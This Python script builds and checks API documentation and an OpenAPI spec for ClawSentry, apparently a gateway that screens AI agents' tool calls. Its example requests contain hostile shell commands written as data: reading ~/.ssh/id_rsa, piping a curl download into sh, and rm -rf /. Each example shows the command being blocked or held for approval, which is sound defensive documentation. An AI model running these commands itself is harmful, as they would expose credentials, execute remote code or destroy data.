#!/usr/bin/env python3
"""Generate and validate the public ClawSentry documentation API inventory.

The inventory is intentionally docs-owned: it records the semantic fields that
FastAPI cannot infer from generic Request/dict handlers while still checking the
route surface against source decorators.
"""
from __future__ import annotations

import argparse
import json
import re
from pathlib import Path
from typing import Any

REPO_ROOT = Path(__file__).resolve().parents[1]
COVERAGE_PATH = REPO_ROOT / "site-docs" / "api" / "api-coverage.json"
OPENAPI_PATH = REPO_ROOT / "site-docs" / "api" / "openapi.json"

SOURCE_FILES = {
    "gateway": REPO_ROOT / "src" / "clawsentry" / "gateway" / "server.py",
    "stack": REPO_ROOT / "src" / "clawsentry" / "gateway" / "stack.py",
    "openclaw-webhook": REPO_ROOT / "src" / "clawsentry" / "adapters" / "openclaw_webhook_receiver.py",
}

# service, method, path, source, group, audience, status, auth, auth_note, markdown_ref, summary
ROUTES: list[dict[str, Any]] = [
    {"service":"gateway","method":"POST","path":"/ahp","source":"src/clawsentry/gateway/server.py:2413","group":"AHP 决策","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token.","markdown_ref":"api/decisions.md#post-ahp","summary":"OpenClaw/AHP JSON-RPC 同步决策入口"},
    {"service":"gateway","method":"POST","path":"/ahp/a3s","source":"src/clawsentry/gateway/server.py:2441","group":"AHP 决策","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token.","markdown_ref":"api/decisions.md#post-ahp-a3s","summary":"a3s-code HTTP Transport 入口"},
    {"service":"gateway","method":"POST","path":"/ahp/codex","source":"src/clawsentry/gateway/server.py:2475","group":"AHP 决策","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token.","markdown_ref":"api/decisions.md#post-ahp-codex","summary":"Codex native hook / HTTP transport 入口"},

    {"service":"gateway","method":"POST","path":"/ahp/adapter-effect-result","source":"src/clawsentry/gateway/server.py:2691","group":"AHP 决策","audience":"developer|operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth; native hook subprocesses should authenticate when token is configured.","markdown_ref":"api/decisions.md#post-ahp-adapter-effect-result","summary":"记录 adapter-observed effect outcome，不修改 canonical decision"},    {"service":"stack","method":"POST","path":"/ahp/resolve","source":"src/clawsentry/gateway/stack.py:203","group":"AHP 决策","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"Uses Gateway auth dependency; CS_AUTH_TOKEN empty disables Bearer auth.","markdown_ref":"api/decisions.md#post-ahp-resolve","summary":"DEFER/审批结果回写入口"},
    {"service":"gateway","method":"GET","path":"/health","source":"src/clawsentry/gateway/server.py:2514","group":"运行状态","audience":"operator","public_status":"public","auth":"none","auth_note":"Gateway health endpoint is intentionally unauthenticated.","markdown_ref":"api/reporting.md#get-health","summary":"Gateway 健康检查"},
    {"service":"gateway","method":"GET","path":"/metrics","source":"src/clawsentry/gateway/server.py:2528","group":"运行状态","audience":"operator","public_status":"public","auth":"metrics-conditional","auth_note":"CS_METRICS_AUTH=true requires Bearer token; false/empty exposes metrics without auth.","markdown_ref":"api/reporting.md#get-metrics","summary":"Prometheus 指标"},
    {"service":"gateway","method":"GET","path":"/report/summary","source":"src/clawsentry/gateway/server.py:2540","group":"报表与监控","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-summary","summary":"聚合统计"},
    {"service":"gateway","method":"GET","path":"/report/stream","source":"src/clawsentry/gateway/server.py:2580","group":"报表与监控","audience":"developer","public_status":"public","auth":"query-token","auth_note":"Accepts Bearer token and browser-friendly ?token= query auth; CS_AUTH_TOKEN empty disables auth.","markdown_ref":"api/reporting.md#get-report-stream","summary":"SSE 实时事件流"},
    {"service":"gateway","method":"GET","path":"/report/sessions","source":"src/clawsentry/gateway/server.py:2694","group":"报表与监控","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-sessions","summary":"会话列表"},
    {"service":"gateway","method":"GET","path":"/report/session/{session_id}/risk","source":"src/clawsentry/gateway/server.py:2787","group":"报表与监控","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-session-risk","summary":"会话风险时间线"},
    {"service":"gateway","method":"GET","path":"/report/session/{session_id}","source":"src/clawsentry/gateway/server.py:3132","group":"报表与监控","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-session","summary":"会话事件回放"},
    {"service":"gateway","method":"GET","path":"/report/session/{session_id}/page","source":"src/clawsentry/gateway/server.py:3180","group":"报表与监控","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-session-page","summary":"分页会话事件回放"},
    {"service":"gateway","method":"GET","path":"/report/alerts","source":"src/clawsentry/gateway/server.py:3244","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-alerts","summary":"告警列表"},
    {"service":"gateway","method":"POST","path":"/report/alerts/{alert_id}/acknowledge","source":"src/clawsentry/gateway/server.py:3327","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#post-report-alerts-acknowledge","summary":"确认告警"},
    {"service":"gateway","method":"GET","path":"/report/session/{session_id}/enforcement","source":"src/clawsentry/gateway/server.py:3351","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-session-enforcement","summary":"查询会话强制状态"},
    {"service":"gateway","method":"POST","path":"/report/session/{session_id}/enforcement","source":"src/clawsentry/gateway/server.py:3358","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#post-report-session-enforcement","summary":"释放会话强制状态"},

    {"service":"gateway","method":"GET","path":"/report/session/{session_id}/quarantine","source":"src/clawsentry/gateway/server.py:3681","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. Quarantine is explicit session mark-blocked state, not guaranteed host termination.","markdown_ref":"api/reporting.md#get-report-session-quarantine","summary":"查询 session quarantine / mark-blocked 状态"},
    {"service":"gateway","method":"POST","path":"/report/session/{session_id}/quarantine","source":"src/clawsentry/gateway/server.py:3691","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. Release is explicit and audited separately from legacy enforcement cooldown.","markdown_ref":"api/reporting.md#post-report-session-quarantine","summary":"释放 session quarantine / mark-blocked 状态"},    {"service":"gateway","method":"GET","path":"/ahp/patterns","source":"src/clawsentry/gateway/server.py:3397","group":"规则与模式","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-ahp-patterns","summary":"查看自进化模式"},
    {"service":"gateway","method":"POST","path":"/ahp/patterns/confirm","source":"src/clawsentry/gateway/server.py:3411","group":"规则与模式","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#post-ahp-patterns-confirm","summary":"确认候选模式"},
    {"service":"openclaw-webhook","method":"POST","path":"/webhook/openclaw","source":"src/clawsentry/adapters/openclaw_webhook_receiver.py:45","group":"Webhook","audience":"developer","public_status":"public","auth":"webhook-token|webhook-hmac-optional","auth_note":"Bearer/OpenClaw token required. HMAC is config-dependent: skipped when no secret is configured; strict mode rejects missing/invalid signatures when secret exists. Timestamp, content-type, optional IP allowlist, and idempotencyKey are validated.","markdown_ref":"api/webhooks.md#post-webhook-openclaw","summary":"OpenClaw Webhook 事件接收"},
]

# L3 advisory endpoints
for item in [
    ("POST","/report/session/{session_id}/l3-advisory/snapshots","2810","创建 L3 evidence snapshot","api/reporting.md#l3-advisory-endpoints"),
    ("GET","/report/session/{session_id}/l3-advisory/snapshots","2850","列出 L3 evidence snapshots","api/reporting.md#l3-advisory-endpoints"),
    ("GET","/report/l3-advisory/snapshot/{snapshot_id}","2863","读取 L3 snapshot 与冻结记录","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/snapshot/{snapshot_id}/jobs","2883","创建 L3 advisory job","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/reviews","2906","写入 L3 advisory review","api/reporting.md#l3-advisory-endpoints"),
    ("PATCH","/report/l3-advisory/review/{review_id}","2950","更新 L3 advisory review","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/snapshot/{snapshot_id}/run-local-review","3002","立即运行本地 L3 review","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/job/{job_id}/run-local","3021","运行本地 L3 job","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/job/{job_id}/run-worker","3040","运行 L3 worker job","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/session/{session_id}/l3-advisory/full-review","3063","对 session 发起 operator full review","api/reporting.md#l3-advisory-endpoints"),
]:
    method,path,line,summary,ref=item
    ROUTES.append({"service":"gateway","method":method,"path":path,"source":f"src/clawsentry/gateway/server.py:{line}","group":"L3 Advisory","audience":"operator|developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.","markdown_ref":ref,"summary":summary})

# Enterprise conditional routes
for method,path,line,summary in [
    ("GET","/enterprise/health","2518","Enterprise enriched health"),
    ("GET","/enterprise/report/summary","2553","Enterprise enriched summary"),
    ("GET","/enterprise/report/live","2573","Enterprise live snapshot"),
    ("GET","/enterprise/report/stream","2638","Enterprise SSE stream"),
    ("GET","/enterprise/report/sessions","2739","Enterprise session list"),
    ("GET","/enterprise/report/session/{session_id}/risk","3106","Enterprise session risk"),
    ("GET","/enterprise/report/session/{session_id}","3155","Enterprise session replay"),
    ("GET","/enterprise/report/session/{session_id}/page","3211","Enterprise paged session replay"),
    ("GET","/enterprise/report/alerts","3284","Enterprise alerts"),
]:
    ROUTES.append({"service":"gateway-enterprise","method":method,"path":path,"source":f"src/clawsentry/gateway/server.py:{line}","group":"Enterprise 条件端点","audience":"operator","public_status":"enterprise","auth":"bearer-disabled-when-empty-token","auth_note":"Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#enterprise-endpoints","summary":summary})

# Excluded/non-reference routes with explicit reason.
for service, method, path, source, reason, ref in [
    ("gateway-ui", "GET", "/ui", "src/clawsentry/gateway/server.py:3478", "Static dashboard shell, documented in Web 仪表板 not API Reference.", "dashboard/index.md"),
    ("gateway-ui", "GET", "/ui/{path:path}", "src/clawsentry/gateway/server.py:3467", "Static dashboard assets, documented in Web 仪表板 not API Reference.", "dashboard/index.md"),
    ("openclaw-webhook", "GET", "/health", "src/clawsentry/adapters/openclaw_webhook_receiver.py:41", "Service-local health duplicates Gateway /health path; documented in webhook page and excluded from shared OpenAPI to avoid path collision.", "api/webhooks.md#webhook-health"),
]:
    ROUTES.append({"service":service,"method":method,"path":path,"source":source,"group":"Excluded","audience":"operator","public_status":"excluded","auth":"none","auth_note":"Not part of shared API Reference.","markdown_ref":ref,"summary":reason,"exclusion_reason":reason})

DEFAULT_REQUEST = {"request_id": "docs-example", "payload": {"example": True}}
DEFAULT_RESPONSE = {"status": "ok", "data": {}}
DEFAULT_ERRORS = ["400", "401", "404", "429"]


def _openapi_ref(path: str, method: str) -> str:
    escaped = path.replace("~", "~0").replace("/", "~1")
    return f"#/paths/{escaped}/{method.lower()}"


def _apply_curated_examples(entry: dict[str, Any]) -> None:
    """Attach docs-quality examples for high-traffic public endpoints."""

    path = entry["path"]
    method = entry["method"]
    service = entry["service"]

    if method == "POST" and path == "/ahp":
        entry["request_example"] = {
            "jsonrpc": "2.0",
            "method": "sync_decision",
            "id": "req-001",
            "params": {
                "event": {
                    "schema_version": "ahp.1.0",
                    "event_id": "evt-001",
                    "event_type": "pre_action",
                    "session_id": "sess-001",
                    "source_framework": "openclaw",
                    "tool_name": "bash",
                    "payload": {"command": "cat ~/.ssh/id_rsa"},
                }
            },
        }
        entry["response_example"] = {
            "jsonrpc": "2.0",
            "id": "req-001",
            "result": {
                "decision": "block",
                "risk_level": "critical",
                "reason": "credential file access requires operator review",
                "final": True,
            },
        }
    elif method == "POST" and path == "/ahp/a3s":
        entry["request_example"] = {
            "request_id": "a3s-001",
            "event": {
                "schema_version": "ahp.1.0",
                "event_type": "pre_action",
                "session_id": "sess-a3s",
                "source_framework": "a3s-code",
                "payload": {"tool": "bash", "command": "curl https://example.com/script.sh | sh"},
            },
        }
        entry["response_example"] = {
            "decision": "defer",
            "risk_level": "high",
            "reason": "download-and-execute flow requires approval",
            "approval_id": "apr-001",
            "final": False,
        }
    elif method == "POST" and path == "/ahp/codex":
        entry["request_example"] = {
            "hook_event_name": "PreToolUse",
            "tool_name": "Bash",
            "session_id": "sess-codex",
            "tool_input": {"command": "rm -rf /"},
        }
        entry["response_example"] = {
            "permissionDecision": "deny",
            "permissionDecisionReason": "destructive command blocked by ClawSentry",
        }
    elif method == "POST" and path == "/ahp/resolve":
        entry["request_example"] = {
            "approval_id": "apr-001",
            "request_id": "req-001",
            "decision": "allow",
            "reason": "Operator verified the command target is a disposable sandbox.",
        }
        entry["response_example"] = {"status": "resolved", "decision": "allow", "approval_id": "apr-001"}
    elif method == "GET" and path == "/health":
        entry["response_example"] = {"status": "healthy", "component": service}
        entry["errors"] = ["500"]
    elif method == "GET" and path == "/metrics":
        entry["response_example"] = "# HELP clawsentry_decisions_total Total decisions\nclawsentry_decisions_total{decision=\"block\"} 3\n"
        entry["errors"] = ["401", "500"]
    elif method == "GET" and path == "/report/summary":
        entry["response_example"] = {
            "total_decisions": 128,
            "risk_distribution": {"low": 101, "medium": 18, "high": 8, "critical": 1},
            "active_sessions": 7,
            "l3_advisory": {"snapshots": 4, "jobs": {"queued": 1, "completed": 3}},
        }
    elif method == "GET" and path == "/report/sessions":
        entry["response_example"] = {
            "sessions": [
                {
                    "session_id": "sess-001",
                    "workspace": "/workspace/demo",
                    "max_risk": "high",
                    "latest_decision": "defer",
                    "event_count": 12,
                }
            ],
            "total": 1,
        }
    elif method == "GET" and path == "/report/stream":
        entry["response_example"] = "event: decision\ndata: {\"session_id\":\"sess-001\",\"decision\":\"block\",\"risk_level\":\"high\"}\n\n"
        entry["errors"] = ["401", "429", "500"]
    elif method == "GET" and path == "/report/session/{session_id}":
        entry["response_example"] = {
            "session_id": "sess-001",
            "records": [
                {
                    "event": {"event_type": "pre_action", "tool_name": "bash"},
                    "decision": {"decision": "block", "risk_level": "high"},
                }
            ],
        }
    elif method == "GET" and path == "/report/session/{session_id}/page":
        entry["response_example"] = {
            "session_id": "sess-001",
            "records": [],
            "next_cursor": None,
            "has_more": False,
        }
    elif method == "GET" and path == "/report/session/{session_id}/risk":
        entry["response_example"] = {
            "session_id": "sess-001",
            "risk_timeline": [{"timestamp": "2026-04-22T08:00:00Z", "risk_level": "high", "reason": "credential access"}],
        }
    elif path.startswith("/report/l3-advisory/") or "/l3-advisory/" in path:
        if method != "GET":
            entry["request_example"] = {"session_id": "sess-001", "runner": "deterministic_local", "queue_only": False}
        entry["response_example"] = {
            "advisory_only": True,
            "canonical_decision_mutated": False,
            "snapshot_id": "l3snap-001",
            "job_id": "l3job-001",
            "review_id": "l3adv-001",
            "l3_state": "completed",
        }
    elif method == "GET" and path == "/report/alerts":
        entry["response_example"] = {
            "alerts": [{"alert_id": "alert-001", "severity": "high", "status": "open", "session_id": "sess-001"}]
        }
    elif method == "POST" and path == "/report/alerts/{alert_id}/acknowledge":
        entry["request_example"] = {"operator": "secops@example.com", "note": "Reviewed and assigned."}
        entry["response_example"] = {"alert_id": "alert-001", "status": "acknowledged"}
    elif path.endswith("/enforcement"):
        if method == "POST":
            entry["request_example"] = {"action": "release", "reason": "Operator cleared the session hold."}
        entry["response_example"] = {"session_id": "sess-001", "enforced": False, "reason": None}
    elif path == "/ahp/patterns":
        entry["response_example"] = {"patterns": [{"id": "credential-upload", "status": "active"}]}
    elif path == "/ahp/patterns/confirm":
        entry["request_example"] = {"pattern_id": "candidate-001", "decision": "confirm"}
        entry["response_example"] = {"pattern_id": "candidate-001", "status": "confirmed"}


def coverage_entries() -> list[dict[str, Any]]:
    entries: list[dict[str, Any]] = []
    for route in ROUTES:
        entry = dict(route)
        if entry["service"] == "openclaw-webhook" and entry["method"] == "POST" and entry["path"] == "/webhook/openclaw":
            entry["request_example"] = {
                "type": "exec.approval.requested",
                "idempotencyKey": "openclaw-demo-001",
                "sessionKey": "sess-001",
                "agentId": "agent-001",
                "payload": {"command": "rm -rf /tmp/demo", "approval_id": "apr-001"},
            }
            entry["response_example"] = {
                "decision": "block",
                "reason": "destructive command pattern detected",
                "risk_level": "high",
                "failure_class": "none",
                "final": True,
            }
            entry["errors"] = ["400", "401", "403", "409", "413", "415", "422", "500"]
        excluded = entry.get("public_status") == "excluded"
        entry.setdefault("request_example", {"query": {}, "path": {}} if route["method"] == "GET" else DEFAULT_REQUEST)
        entry.setdefault("response_example", DEFAULT_RESPONSE)
        entry.setdefault("errors", ["500"] if route["method"] == "GET" and route["auth"] == "none" else DEFAULT_ERRORS)
        _apply_curated_examples(entry)
        entry.setdefault("exclusion_reason", None)
        entry["openapi_ref"] = None if excluded else _openapi_ref(route["path"], route["method"])
        entries.append(entry)
    return entries


def extract_source_routes() -> set[tuple[str, str, str]]:
    patterns = {
        "gateway": re.compile(r"@app\.(get|post|patch)\(\"([^\"]+)\""),
        "gateway-enterprise": re.compile(r"@_enterprise_get\(\"([^\"]+)\""),
        "stack": re.compile(r"@app\.(post)\(\"([^\"]+)\""),
        "openclaw-webhook": re.compile(r"@app\.(get|post)\(\"([^\"]+)\""),
    }
    found: set[tuple[str, str, str]] = set()
    for service, path in SOURCE_FILES.items():
        text = path.read_text(encoding="utf-8")
        if service == "gateway":
            for method, route in patterns["gateway"].findall(text):
                found.add(("gateway", method.upper(), route))
            for route in patterns["gateway-enterprise"].findall(text):
                found.add(("gateway-enterprise", "GET", route))
        elif service == "stack":
            for method, route in patterns["stack"].findall(text):
                found.add(("stack", method.upper(), route))
        else:
            for method, route in patterns["openclaw-webhook"].findall(text):
                found.add(("openclaw-webhook", method.upper(), route))
    return found


def write_coverage() -> None:
    COVERAGE_PATH.write_text(json.dumps(coverage_entries(), ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def operation_for(entry: dict[str, Any]) -> dict[str, Any]:
    params = []
    for name in re.findall(r"\{([^}:]+)(?::[^}]+)?\}", entry["path"]):
        params.append({"name": name, "in": "path", "required": True, "schema": {"type": "string"}})
    if entry["path"] in {"/report/summary", "/report/sessions", "/report/session/{session_id}", "/report/session/{session_id}/page", "/report/session/{session_id}/risk", "/report/stream", "/report/alerts"}:
        params.append({"name": "window_seconds", "in": "query", "required": False, "schema": {"type": "integer", "minimum": 1, "maximum": 604800}})
    if entry["path"] == "/report/stream":
        params.extend([
            {"name":"session_id","in":"query","required":False,"schema":{"type":"string"}},
            {"name":"min_risk","in":"query","required":False,"schema":{"type":"string","enum":["low","medium","high","critical"]}},
            {"name":"types","in":"query","required":False,"schema":{"type":"string"}},
            {"name":"token","in":"query","required":False,"schema":{"type":"string"}},
        ])
    if entry["service"] == "openclaw-webhook" and entry["path"] == "/webhook/openclaw":
        params.extend([
            {"name": "Authorization", "in": "header", "required": True, "schema": {"type": "string"}, "description": "Bearer <OPENCLAW_WEBHOOK_TOKEN>"},
            {"name": "X-AHP-Signature", "in": "header", "required": False, "schema": {"type": "string"}, "description": "v1=<hmac-sha256>, required in strict mode when OPENCLAW_WEBHOOK_SECRET is configured"},
            {"name": "X-AHP-Timestamp", "in": "header", "required": False, "schema": {"type": "string"}, "description": "Unix timestamp used for signed webhook replay protection"},
            {"name": "Content-Type", "in": "header", "required": True, "schema": {"type": "string", "enum": ["application/json"]}},
        ])
    success_content_type = "application/json"
    if entry["path"] == "/metrics":
        success_content_type = "text/plain"
    elif entry["path"] == "/report/stream":
        success_content_type = "text/event-stream"

    op: dict[str, Any] = {
        "tags": [entry["group"]],
        "summary": entry["summary"],
        "description": f"Service: `{entry['service']}`. Auth: `{entry['auth']}`. {entry['auth_note']} See `{entry['markdown_ref']}`.",
        "parameters": params,
        "responses": {
            "200": {
                "description": "Successful response",
                "content": {
                    success_content_type: {"example": entry["response_example"]}
                },
            },
        },
        "x-clawsentry-source": entry["source"],
        "x-clawsentry-markdown-ref": entry["markdown_ref"],
        "x-clawsentry-auth-note": entry["auth_note"],
    }
    if entry["method"] != "GET":
        op["requestBody"] = {"required": entry["service"] == "openclaw-webhook" or entry["method"] in {"POST", "PATCH", "PUT"}, "content": {"application/json": {"example": entry["request_example"]}}}
    for code in entry.get("errors") or []:
        op["responses"].setdefault(code, {"description": f"Error {code}"})
    if "bearer" in entry["auth"] or entry["auth"] == "query-token":
        op["security"] = [{"BearerAuth": []}]
    if entry["service"] == "openclaw-webhook" and entry["path"] == "/webhook/openclaw":
        op["security"] = [{"BearerAuth": []}]
    return op


def write_openapi() -> None:
    paths: dict[str, Any] = {}
    for entry in coverage_entries():
        if entry["public_status"] == "excluded":
            continue
        paths.setdefault(entry["path"], {})[entry["method"].lower()] = operation_for(entry)
    spec = {
        "openapi": "3.1.0",
        "info": {
            "title": "ClawSentry Public API Reference",
            "version": "0.5.4",
            "description": "Docs-owned OpenAPI artifact generated from route inventory plus curated semantic metadata. It does not change runtime API behavior.",
        },
        "servers": [
            {"url": "http://127.0.0.1:8080", "description": "ClawSentry Gateway"},
            {"url": "http://127.0.0.1:8081", "description": "OpenClaw Webhook Receiver (example)"},
        ],
        "components": {
            "securitySchemes": {"BearerAuth": {"type": "http", "scheme": "bearer"}, "WebhookSignature": {"type": "apiKey", "in": "header", "name": "X-AHP-Signature"}, "WebhookTimestamp": {"type": "apiKey", "in": "header", "name": "X-AHP-Timestamp"}},
            "schemas": {
                "CanonicalDecision": {"type":"object","required":["decision","reason","risk_level"],"properties":{"decision":{"type":"string","enum":["allow","block","defer","modify"]},"reason":{"type":"string"},"risk_level":{"type":"string","enum":["low","medium","high","critical"]},"final":{"type":"boolean"}}},
                "CanonicalEvent": {"type":"object","required":["schema_version","event_id","event_type","session_id","source_framework","payload"],"properties":{"schema_version":{"type":"string"},"event_id":{"type":"string"},"event_type":{"type":"string"},"session_id":{"type":"string"},"source_framework":{"type":"string"},"payload":{"type":"object"}}},
                "ErrorResponse": {"type":"object","properties":{"error":{"type":"string"},"failure_class":{"type":"string"}}},
            },
        },
        "paths": paths,
        "x-clawsentry-docs": {"coverage": "api-coverage.json", "source": "scripts/docs_api_inventory.py"},
    }
    OPENAPI_PATH.write_text(json.dumps(spec, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def validate() -> list[str]:
    errors: list[str] = []
    coverage = json.loads(COVERAGE_PATH.read_text(encoding="utf-8"))
    by_key = {(e["service"], e["method"], e["path"]): e for e in coverage}
    expected = {(e["service"], e["method"], e["path"]) for e in coverage_entries()}
    actual = set(by_key)
    if expected - actual:
        errors.append(f"coverage missing expected entries: {sorted(expected - actual)}")
    source_routes = extract_source_routes()
    normalized_source = set()
    for service, method, path in source_routes:
        if service == "gateway" and path.startswith("/enterprise/"):
            service = "gateway-enterprise"
        if service == "gateway" and path.startswith("/ui"):
            service = "gateway-ui"
        normalized_source.add((service, method, path))
    if normalized_source - actual:
        errors.append(f"source routes missing from coverage: {sorted(normalized_source - actual)}")
    required = {"service","method","path","source","group","audience","public_status","auth","auth_note","markdown_ref","summary","exclusion_reason"}
    semantic = {"request_example","response_example","errors","openapi_ref"}
    for entry in coverage:
        missing = [field for field in required if field not in entry]
        if missing:
            errors.append(f"{entry.get('service')} {entry.get('method')} {entry.get('path')} missing {missing}")
        if entry.get("public_status") == "excluded":
            if not entry.get("exclusion_reason"):
                errors.append(f"excluded route {entry.get('path')} lacks exclusion_reason")
            continue
        for field in semantic:
            if entry.get(field) in (None, "", []):
                errors.append(f"public route {entry['service']} {entry['method']} {entry['path']} missing {field}")
    openapi = json.loads(OPENAPI_PATH.read_text(encoding="utf-8"))
    for entry in coverage:
        if entry.get("public_status") == "excluded":
            continue
        if entry["path"] not in openapi.get("paths", {}) or entry["method"].lower() not in openapi["paths"][entry["path"]]:
            errors.append(f"openapi missing {entry['method']} {entry['path']}")
    return errors


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("command", choices=["write", "validate", "list-routes"])
    args = parser.parse_args()
    if args.command == "write":
        write_coverage()
        write_openapi()
        return 0
    if args.command == "list-routes":
        print(json.dumps(sorted(extract_source_routes()), ensure_ascii=False, indent=2))
        return 0
    errors = validate()
    if errors:
        print("\n".join(errors))
        return 1
    print("docs API inventory is valid")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
